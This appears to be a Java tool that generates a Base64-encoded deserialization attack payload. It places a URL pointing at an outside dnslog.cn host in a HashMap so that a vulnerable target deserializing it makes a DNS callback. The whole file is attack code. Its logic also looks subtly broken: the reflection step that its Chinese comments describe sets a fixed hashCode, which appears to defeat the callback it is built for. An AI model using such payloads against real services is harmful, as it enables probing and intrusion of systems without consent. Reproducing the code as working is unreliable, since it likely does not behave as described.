package com.example.Test;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class GeneratePayload {
    public static void main(String[] args) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        URL url = new URL("http://tests.ycvbge.dnslog.cn");
        map.put(url, 0);

        // 通过反射设置hashCode避免触发DNS查询
        Class<?> clazz =  Class.forName("java.net.URL");
        java.lang.reflect.Field hashCodeField = clazz.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 123); // 任意非-1的值

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();

        byte[] payload = bos.toByteArray();
        System.out.println(java.util.Base64.getEncoder().encodeToString(payload));
    }
}